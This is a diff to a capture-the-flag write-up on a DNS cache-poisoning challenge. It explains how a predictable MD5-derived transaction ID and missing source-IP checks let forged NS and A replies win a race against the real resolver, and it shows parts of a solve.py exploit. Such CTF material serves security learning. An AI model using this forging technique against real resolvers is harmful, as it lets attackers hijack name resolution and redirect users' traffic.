@@ -9,52 +9,82 @@ We’re given a target DNS server at 34.134.162.213, with two key UDP ports:
 17014 – used by the internal resolver to receive replies
 ```
 
-# Analysis
+# Recon & Analysis
 
-This challenge is DNS cache poisoning, with the following twist:
+After source recovery and analysis, we find this key snippet from `main.py`:
+```py
+http_comment = f"I like your subdomain: {FLAG}" if resolved_ip == '127.0.0.1' and internal_domain in qname else None
+```
 
-1. The server uses a predictable Transaction ID (TID) based on:
+This shows that the flag is only leaked via a TXT record, and only when:
+
+- The queried domain ends with dns_l3ak.ctf.itsbengsky.id
+- The resolved IP is 127.0.0.1
+- The subdomain matches rule
+
+# Internal Access Control
+
+In `core.py`, we find the resolver strictly enforces subdomain access:
 
 ```py
-TID = struct.unpack("!H", md5(f"{CALLER}_{timestamp}"))[:2]
+caller_hash = hashlib.sha256(caller.encode()).hexdigest()[0:63]
+if domain.split(".")[0] != caller_hash:
+    return None
 ```
-2. The resolver first queries the base domain (dns_l3ak.ctf.itsbengsky.id) and expects an NS referral.
-3. If we can respond with an NS record pointing to our server and later respond with a fake A record (with a correct TID), we can trick the resolver into querying us for further records.
+So even if we query the correct internal domain, unless the subdomain matches our IP's hash, we won’t get anything.
 
-Once we poison the DNS resolver’s cache, the target will eventually leak a TXT record from the internal domain by resolving it — revealing the flag.
 
-# Exploitation Steps
-1. Predict the TID
-Since the server uses:
+# The Real Vulnerability — Race Condition in core.py
+
+The heart of the vulnerability lies in the resolver’s packet handling logic. Consider this snippet from `resolver/core.py`:
 ```py
-timestamp = int(time.time()) // 0.2
-hash = md5(f"{CALLER}_{timestamp}")
+def send_query(self, tid: int, query: bytes, server_ip: str):
+    with self.lock:
+        if tid in self.responses:
+            return self.responses.pop(tid)
+        self.pending_tids.add(tid)
+
+    time.sleep(3)
+    self.sock.sendto(query, (server_ip, 53))
+
+    start = time.time()
+    while time.time() - start < 5:
+        with self.lock:
+            if tid in self.responses:
+                response = self.responses.pop(tid)
+                self.pending_tids.discard(tid)
+                return response
 ```
-We can predict the transaction ID (TID) as long as our clock is synced with the server and we use the correct IP in CALLER.
+And from the listener thread:
+```py
+def _listen_loop(self):
+    while True:
+        res, _ = self.sock.recvfrom(512)
+        tid = int.from_bytes(res[:2], byteorder='big')
+        with self.lock:
+            if tid not in self.pending_tids or tid in self.responses:
+                continue
+            self.responses[tid] = res
+            self.pending_tids.remove(tid)
+```
 
-2. Trigger the Resolver Flow
+## Why This is a Race Condition
+- The resolver accepts any UDP response to its internal port (53535, exposed externally via 17014) as long as the TID matches a pending query.
+- It does not validate the source IP.
+- If we can predict the TID (which is generated from a known MD5 hash of our IP and timestamp), we can forge a response and win the race against the real upstream server.
 
-We send a real query to dns_l3ak.ctf.itsbengsky.id to start the resolution process.
+# Exploitation Strategy
+- Predict TID based on:
+```py
+md5(f"{caller}_{timestamp}")[:2]
+```
+- Send a real DNS query for the internal domain, triggering outbound recursive resolution.
+- Race the resolver with:
+- - A fake NS referral pointing to 127.0.0.1
+- - A fake A record resolving the internal subdomain to 127.0.0.1
+- Query the TXT record — the server thinks the internal domain belongs to you and reveals the flag.
 
-This causes the server to wait for an NS referral.
-
-3. Inject a Forged NS Referral
-We respond with:
-
-Authority section: NS xixixi (our fake NS)
-Additional section: xixixi A 127.0.0.1 
-
-4. Inject a Fake A Record
-Once the resolver believes we're authoritative, it will ask us for A records for subdomains.
-
-We respond with a forged A record for the internal random subdomain.
-
-
-**We spam this to increase the chance of winning the race condition.**
-
-5. Finally, once the resolver caches our A record, we repeatedly try to resolve TXT records:
-
-
+Exploit Script Summary
 solve.py
 ```py
 import hashlib
@@ -74,7 +104,8 @@ FAKE_NS = "xixixi"
 FAKE_NS_IP = "127.0.0.1"
 
 def get_internal_domain():
-    return f"{random.randint(1, 99999999)}.{INTERNAL_BASE}"
+    caller_hash = hashlib.sha256(CALLER.encode()).hexdigest()[:63]
+    return f"{caller_hash}.{INTERNAL_BASE}"
 
 def get_tid():
     """Predicts TID based on timestamp and caller IP."""
@@ -182,4 +213,11 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 ```
+
+## Key actions:
+- send_real_query() — starts the legit resolution
+- send_forged_ns_response() — injects fake NS record (points to 127.0.0.1)
+- send_forged_final_response() — injects fake A record
+- get_txt_flag() — finally queries the TXT record and reveals the flag
